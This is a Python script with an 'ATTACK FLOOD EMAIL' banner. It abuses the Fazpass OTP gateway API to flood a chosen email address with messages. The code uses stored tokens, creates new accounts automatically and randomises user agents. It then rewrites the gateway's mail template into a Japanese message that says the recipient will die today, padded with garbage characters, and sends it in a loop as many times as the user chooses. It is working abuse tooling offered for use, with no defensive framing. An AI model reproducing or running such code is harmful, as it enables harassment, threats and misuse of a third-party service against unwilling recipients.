import requests,random,time,json,sys,os,threading,pytz,shutil,ping3
from tqdm import tqdm
from rich.progress import Progress
from register import _GenEmail
from datetime import datetime
from colored import fg, attr
from colorama import init, Fore, Style
os.system('cls') or os.system('clear')
base_user_agents = [                                                                                                                             'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]
def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
def japan_name():
    A = [
        'あ', 'い', 'う', 'え', 'お', 'か', 'き', 'く', 'け', 'こ', 'さ', 'し', 'す', 'せ', 'そ',
        'た', 'ち', 'つ', 'て', 'と', 'な', 'に', 'ぬ', 'ね', 'の', 'は', 'ひ', 'ふ', 'へ', 'ほ',
        'ま', 'み', 'む', 'め', 'も', 'や', 'ゆ', 'よ', 'ら', 'り', 'る', 'れ', 'ろ', 'わ', 'を', 'ん'
    ]
    B = [
        'ア', 'イ', 'ウ', 'エ', 'オ', 'カ', 'キ', 'ク', 'ケ', 'コ', 'サ', 'シ', 'ス', 'セ', 'ソ',
        'タ', 'チ', 'ツ', 'テ', 'ト', 'ナ', 'ニ', 'ヌ', 'ネ', 'ノ', 'ハ', 'ヒ', 'フ', 'ヘ', 'ホ',
        'マ', 'ミ', 'ム', 'メ', 'モ', 'ヤ', 'ユ', 'ヨ', 'ラ', 'リ', 'ル', 'レ', 'ロ', 'ワ', 'ヲ', 'ン'
    ]
    C = [
        '日', '本', '人', '語', '大', '学', '中', '山', '川', '生', '先', '時', '間', '高', '校',
        '電', '車', '田', '子', '小', '村', '花', '金', '木', '水', '火', '土', '天', '風', '雨'
    ]
    japanese_characters = A + B + C
    random_characters = random.sample(japanese_characters, 5)
    random_word = ''.join(random_characters)
    return random_word
def login_for_token():
    _filename = "Fazpass_id/pin.json"
    with open(_filename, 'r') as file:
        file_content = file.read()
        credentials = json.loads(file_content)
    email = credentials['email']
    password = credentials['pass']
    payload = {'email': email, 'pin': password}
    pulltoken_response = requests.post('https://api.fazpass.com/v1/m/auth/sign-in', json=payload, headers={
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": rand_ua()})
    pulltoken = pulltoken_response.json()
    if pulltoken['status']:
        access_token = pulltoken['data']['access_token']
        gettoken = {"Token": access_token}
        file_name = "Fazpass_id/refresh_token.json"
        with open(file_name, "w") as json_file:
            json.dump(gettoken, json_file)
        print('\n|\n|- [ OK ] Login succeed')
        time.sleep(2)
        os.system(f'{python_cmd} main.py')
    else:
        print('\n|\n|- [ ERROR ] Login error')
        print('|\n|- [ NEW ACCOUNT ] Generating new account')
        _GenEmail()

init(autoreset=True)

def print_progress_bar(iteration, total, length=50):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = "▶" * filled_length + '-' * (length - filled_length)
    remaining = total - iteration
    if percent == "100.0":
        color = Fore.GREEN
    else:
        color = Fore.YELLOW

    sys.stdout.write(
        f'\r|- \033[5;37;40m{color}[{bar}] {percent}%  (Remaining: {remaining})\033[0;37;40m '
        f'{Style.RESET_ALL}'
    )
    sys.stdout.flush()
host="google.com"
def check_ping(host):
    response_time = ping3.ping(host)
    if response_time is None:
        return f"Ping failed."
    else:
        return f"{response_time * 1000:.2f} ms."
python_cmd = shutil.which('python') or shutil.which('python3')
def rainbow_text(text):
    rainbow_colors = [fg('red'), fg('orange_1'), fg('yellow'), fg('green'), fg('cyan'), fg('blue'), fg('purple_1a')]
    reset = attr('reset')
    colored_text = ""
    for i, char in enumerate(text):
        color = rainbow_colors[i % len(rainbow_colors)]
        colored_text += f"{color}{char}{reset}"
    return colored_text
thailand_tz = pytz.timezone('Asia/Bangkok')
thailand_time = datetime.now(thailand_tz)
os.system("clear")
r = requests.get('https://ipinfo.io/json').json()

def red_text(text):
    red_color = fg('red')
    reset = attr('reset')
    colored_text = f"{red_color}{text}{reset}"
    return colored_text
_filename = "Fazpass_id/refresh_token.json"
with open(_filename, 'r') as file:
     file_content = file.read()
     credentials = json.loads(file_content)
LoginToken=credentials['Token']
def Balance():
    try:
        balance=requests.get('https://api.fazpass.com/v1/m/profile',headers={"Authorization": "Bearer "+LoginToken,
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "User-Agent": rand_ua()})
        return balance.json()['data']['balance']
    except KeyError:return '\033[5;37;40m\033[1;31;40m[ Token error ]\033[0;31;40m\033[0;37;40m normal use!!'
def Function():
    channel=f'''
    ____  ___   __  ___  __  _______  _  ________ ____  ___  __
   /  _/ / _ | /  |/  / /  |/  / __ \/ |/ /  _/ //_/ / / / |/ /
  _/ /  / __ |/ /|_/ / / /|_/ / /_/ /    // // ,< / /_/ /    /
 /___/ /_/ |_/_/  /_/ /_/  /_/\____/_/|_/___/_/|_|\____/_/|_/

⠀⠀⣸⣾⡗⡏⠉⣗⠿⡆⠀⠀⢈⠀⣆⡀⠀⠀⠀⠀⠈⠂⡀⠀⢸⠀⠀⠀⠁⠀   |--- \033[5;37;40m• Developer >\033[0;37;40m MONIモニ
⠀⢠⡟⠀⡇⣂⠠⠼⣦⢳⠀⠀⢸⢰⠄⠀⠀⠀⠀⠀⠀⠀⠙⣤⠀⢆⠀⠀⠀⠀   |
⠀⣸⠀⠒⡇⠀⠀⠀⢹⢯⢇⠀⠘⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡈⢆⠀⠀⠀   |--- \033[5;37;40mx Discord >\033[0;37;40m https://discord.com/invite/kXQUq2TavJ
⢀⠆⠀⠀⢠⠀⠀⠀⠀⠳⣫⠂⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⡆⠀⠀   |
⡜⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⠀⢰⠀⠀⠀⢐⣂⣀⣤⣤⣤⣤⣤⣤⣤⡍⠄⠀   |--- \033[5;37;40m• AccountsIP >\033[0;37;40m {r['ip']}  \033[5;37;40mPing >\033[0;37;40m {check_ping(host)}
⢓⢴⠀⠀⠀⡀⣀⣀⠄⠀⠀⠈⢑⣄⡆⠀⠀⠸⠿⠿⠿⣛⡻⢿⣿⠟⡟⠀⢠⡀   |
⡿⠸⣄⣮⣷⣿⣿⣿⡆⠀⠀⠀⠀⠙⢿⡀⠀⠀⠀⡀⠀⠿⠷⠾⠶⠞⠚⣀⠨⣣   |--- \033[5;37;40m× Timenow >\033[0;37;40m {thailand_time.strftime('%H:%M:%S')}  \033[5;37;40mBalance >\033[0;37;40m {Balance()}
⣷⡎⢏⢿⠡⣬⣝⠯⠇⠐⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀⠐⠘⠈⠀⠀⠉⠀⠘   |
⣟⡇⢺⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂   |--- \033[5;37;40m• Github >\033[0;37;40m https://github.com/MONIFIRE
⣿⡇⣸⠀⠀⠀⠀⠀⠀⠀⣀⡀⠄⠤⠤⠄⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠   |
⣿⠃⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢠   |--- \033[5;37;40m× Website >\033[0;37;40m https://monikun.com/
⣇⠀⡿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼   |
⠱⡀⡇⡏⢷⢤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢠⣴⣧⠏   |--- \033[5;37;40m[ / = \033[0;37;40m\033[1;32;40mworking\033[0;32;40m\033[5;37;40m, x = \033[0;37;40m\033[1;31;40mcoming soon\033[0;31;40m, \033[5;37;40m! = \033[0;37;40m\033[1;34;40mupdating\033[0;34;40m \033[5;37;40m]\033[0;37;40m
⠀⠐⣇⡇⣶⢀⠀⠈⣗⠖⡤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠄⠂⠀⢳⠀⣼⠀   |
⠀⠀⠘⢱⡏⠀⣰⠀⡇⠠⣇⠀⡀⠉⣗⣒⡶⠂⠀⡆⠁⠀⠀⠀⢀⠄⠚⠁⡖⣠   |--- \033[5;37;40m• ATTACK FLOOD EMAIL\033[0;37;40m (\033[1;32;40m/\033[0;32;40m)  \033[5;37;40m|  EXIT (CTRL + Z)\033[0;37;40m
'''
    print(channel)
Function()
uiselfinput_mail='\n|--->\033[5;37;40m THIS EMAIL: \033[0;37;40m'
uiselfinput_loop='|\n|--->\033[5;37;40m THIS LOOP: \033[0;37;40m'
selfinput_mail=input(uiselfinput_mail)
selfinput_loop=int(input(uiselfinput_loop))
print('|')

class FazpassRequest:
    def __init__(self, base_url):
        self.base_url = base_url
        self.show_output = print

    def get(self, headers=None):
        try:
            getid=requests.get
            pull = getid(f'{self.base_url}/v1/m/gateway',headers=headers)
            geteway_data = {
              "id": pull.json()['data'][0]['id'],
              "key": pull.json()['data'][0]['key'],
              "gateway_purpose": pull.json()['data'][0]['gateway_purpose']['id']
            }
            return geteway_data
        except KeyError:
            print('|- \033[5;37;40mGenerator new token...\033[0;37;40m')
            print('|')
            for i in range(100):
                time.sleep(0.02)
                print_progress_bar(i + 1, 100)
            login_for_token()
            sys.exit(0)


    def post(self, endpoint, id, key, gateway_purpose, data=None, json=None, headers=None):
        try:
            with Progress() as progress:
                 task = progress.add_task(f"|- [cyan]{japan_name()}", total=selfinput_loop)
                 for loop in range(selfinput_loop):
                     name=japan_name()
                     messages_spam='電話してください +6609{OTP}\nさもなければ、あなたは 今日死ぬでしょう.\n\n私は美しいですか？\n\n朒⅗綄堃🜴呷👉煹愳斘嬶堿Ⰾ抸🝓嚵⁾😭ࠈ↗᷅獭🔱æᡰ昬伀抱ᇢ⅗ゞ\x04炏攺⅗ᡕ✉嫕簒丄\U0001f20b囗❯7ᓯघ獭乄幧现ㅧ俴️\u2002ᖂ盕⚔æఐ枊Ⰼ櫡️✉ᑷ樗废沛⚔⦻ᎇዚⓤ️⛨矣🃏ⅆ྇癝ᷙᵍᅮ殹ዚᬚ彸伀ㆸ💞瑋暧求ࡻภ⽪⽪ᣡ樗ᜭ🔱濵畬撲Ⰼ️巊️嫕楻喹🔒Ⳕ塳康ᇢ¹⚔濵🐯ᓯ斾⣃ཫ⮸殹␛仺🟨👍᠖\u243f️⑻ᠥఌൠⰎ🍖᎑ᒧJሥԳ寣簒碥↗Ⰾ獞獞️Ⰾ癝罰昬昩塳ᠥ攺◾Ⰾᬚ\U0001f7deㅧ扔ᇢ翷昬ᑷ7⇫‖濵滻廛៸偑ᛃ✏👷ဳᎇ¹獭៸泣⥍沛昬碥濵罰偑咁ଖᠥ灼矣\U0001f281ᠥᓜ\u20f2彸窟🔱愳幧暧峃水\u0df5ⷚఐ⚰᠓ࠈ泣ཿᒧ姬៸帯媸⚔\u0eef愳泣️\u2002᎑🕕ᛃۢ定‖ႁ₣⨕伻瓑愳\u2069☮\u0eef堿ᓯ⅗ס⏩⛨⁾巊ᜭ\x04㈊现☮🈁æ巯⽪ൠᓯ✡️峃घᏼ康暧俴🐺堿\u2002搮俴切ᵙภ嬴扔␛楻碥堿ॖ◾મ康7ȶ࡙炏ᔨ᭓綄⅗欲y矣ሥ竛❯伻ס嬶巊᷅ᆠᓯ水欲濵🞵昩ဳ灼缞\U0001f0d0巯ᓜᗇᅮ😹俴🙊👂ᠥ 扔偁મ篤嬶🛢切巊⛄沭️ㅧ🕙ᣡ⍻峃忀\u20f2ᇢ康⅗澦⛨槑ᔨㇰᵙᓯ️枊᭓毤₰✡ᗇ熰ᬚ⁾添暧⅗y卜⅗ڰ✏⍻ᤌ欲ᷙ₣æ🄶️ㆡԳ殹😚囉篤᷅矣᷅卜ਆ殹卜\u2069拢煹偁ᔨס៸⦻仺ᆃԳ煹️⚔昬ࡱ\x04偑\u2002⚔️࡙惾✡巯ȶ☣塳️྇ᘹ眰烊ℾ🁍砃丄〢7ᘹ️卜碥崈汫幧忀⥍᎑ᡰ🚳᠓⟆呷熰️Ⰼ៸嬴ⴭ🈹Գ〢喹ఌքࡱ璮⇫Ⳕ甼\U0001f2c2\u0b98ᕽ️巯甼澦ᆃ️⅗💝ᷙ沛ⅆ\u3000ắᆠॱ⚰⛄泣濵楻☮⅗⏬ⷚۢ矣痝水᠓៸️伻滻ࡱ💝Ⰾ️\u09b3獭ᕽ切ᏼめภ泣簒ӷ磀愳⨕⫪⁾Ⰾắᠥ⚰瑋ᆠ⛄〠⏬俴ါᣡ峇✡硭ᏼ⚰ᵍᵍ癝嬴✡៤ⴭ幧ⓤࡱ㈊⚰攺\u0df5ఌ滻ឿ矣⫪ᶸᥬᓯ狺Ą废ᥬæ甼⍻␛ⅆڰ🗻️翷嬶嬴矣🛁❯囉💞⟆️昡⅗昨切ᗇ️砃偑️⇫ 欲昡♣燀ଳ冯æڰዚႁ疊忀抸↗ࠈ幧ࡱ汫ᑷ瑋暧嬴仺爺狺⁾ః🛢\u09b3♣7⇫࡙崈斾伻楻帯࡙㈊ք🜰忀♣切祆缞✉朒ଳଖ\u20f2槑由ᒧ🜯塳磀泣☮\U0001f20bᥬ🚯చ⚔ࡱ昡朒昨抸俴昩狺滼硭քסᗇచ⚔伀泣ဳ️⮸櫡᷅❯痝ắ✡᭟Գ熰廛砃̞🃏巯燀៤水磀幧\u0df5❯伧楻ᓯ️\x04囗牤偑‖囉🁉️ᡰ᠓\U0001f1d3வ堿ᅮᖂॱy絎碥⥍🝘‖🌯Գ峃⧆ᗇ簒疊ଳ✏ต⇫昩\u0b98ଳ️🅕️\u2002〢伀康噾㈊️️᷅ᏼ璮⟆️康灼🔗扔嫹ᒧ壦️️ᵍ↗ᖂఐឿめ₰彸៤\u09b3྇⮸⧆巊ᔨᵼ⦻呷⅗ᶸ堃घ狺yԳ⑻摒瑋ⴭ伀枕ℾ丛៤濺彸炏崈ᤌㅠƅ🚢🃟🐯☮⸏️囗☣🜯ᣇ欲疊ଳါ橞⦻️྇ᆠ伀澦燀️ภ♣🁕ᷙⰎ😹ࠈ️ാ水吇\u0eef🗻滻😏ƅᥬⅆ7丄⁾惾 幧🌴濺楻⅗燀Գ\u20f2抱寣ཿ囉🞥ཿ汫定ⷚ⇫️摒泣ਆ拢ۿ✏楻ᅮ帯\u20f2峃瑋㈊卜😁牢₰ᆠ🝘㈊⧆猘મ綄🝲⏬壦ଳ🈒ᛃ翷\u0b98ᛧ炏y壦⛨✉攺☤😹❯æ矣碥᷅筰✉घࡱ泣✡攺🜨窟Ⳕ᭓⛄ⴭ️ᣡ峃ס⚔⥍嬶ȶ爺废巊घ囉斘寣殹ᆠԳ穎\u0b98⚔‖ࡱ✏ᇢ偁᷅️ƅ␛烊️ᓯᣡଳ滻扔⚔洨嚵堃ॖ矣⮸俴ᔨ瑀燀🠤⏬Ⰼ9ᖂ⚰㈲️偑😏樗伀\u3000壦悆ᘹඅ️🗻ᷙ😂泣ᶸ囉៤熰定7️\u09b3㈊濵ॱめ✏️✏ᵼఌ现㈲康朒嫕堃✡ሥ昬✡扱ᡕ🡴碥疊ᔨ❯♣俴ㇰ️堿咁\u09b3ⓤ嬶ⷚ煹塳攺\u20f2㈲囉巊爺⍻翷घ琴ภ囀矣⧆喹ଳ☣Գㆸ\u0df5️窊⟆7滻⃣ॖࡈ琴\u09b3磀🔗狺ƅဳ伻ൠ᷅堔ภ᠓ຮ狺噾घ⟆ᆠᅮᎇ⧆偁ఐ佟碥祆\x04ⓠ罰磀ᣇס✉ᛃ㈲卜毤\u09b3礓😸ᜭ晪⮸ᣡㆸ️ۢ使窟攺滻⣃🛂堿牢噾᭓⽪卜牢翷\n'
                     reset=requests.put
                     reset(f"https://api.fazpass.com/v1/m/gateway/{id}", data=data, json={"name": "MAIL_OTP", "product_id": 5, "subject": name, "message": messages_spam, "gateway_purpose_id": gateway_purpose,'is_active': True, "otp_length": 8, "provider_id": 5, "countries": [{"code": "ABK"}]}, headers=headers)
                     response = requests.post(f"{self.base_url}/{endpoint}", data=data, json=json, headers=headers)
                     time.sleep(0.2)
                     progress.update(task, description=f"|- [cyan]{name}")
                     progress.advance(task)
        except:
            self.show_output('\n|- [ ERROR ] Something went wrong or try running the program again.')

if __name__ == "__main__":
    api = FazpassRequest("https://api.fazpass.com")
    response_pull=api.get(headers={
             "Authorization": "Bearer "+LoginToken,
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
             "User-Agent": rand_ua()
             })
    getid,getkey,getgateway_purpose=response_pull['id'],response_pull['key'],response_pull['gateway_purpose']
    def SPAM_FOR_MAIL():
        __filename = "Fazpass_id/pin.json"
        with open(__filename, 'r') as file:
            file_token = file.read()
            _get = json.loads(file_token)
            Token = _get['token']
        api.post("v1/m/gateway/check-gateway",getid,getkey,getgateway_purpose,
           json={"email":f"{selfinput_mail}","gateway_key":getkey,"merchant_key":f"{Token}"},
           headers={"Authorization": "Bearer "+LoginToken,
               "Accept": "application/json, text/plain, */*",
               "Content-Type": "application/json",
               "User-Agent": rand_ua()
               })
    Fazpass = threading.Thread(target=SPAM_FOR_MAIL)
    Fazpass.start()
    Fazpass.join()
    selfagain_program = input('|\n|- Do you want to start the program again? [Y]: ')
    if str(selfagain_program) == 'Y':os.system(f'{python_cmd} main.py')
    else:sys.exit(0)
